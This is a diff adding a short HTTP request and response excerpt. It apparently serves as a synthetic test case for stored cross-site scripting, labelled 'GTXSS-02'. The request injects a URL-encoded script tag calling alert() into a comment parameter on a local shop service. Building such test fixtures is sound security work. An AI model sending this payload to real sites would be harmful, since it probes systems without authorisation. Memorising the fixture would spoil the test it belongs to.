@@ -1,0 +1,8 @@
+REQUEST
+GET /comment?text=%3Cscript%3Ealert(9)%3C/script%3E HTTP/1.1
+Host: svc-shop:8001
+Connection: close
+
+
+RESPONSE-EXCERPT
+<html>comment GTXSS-02 synthetic stored xss echo</html>
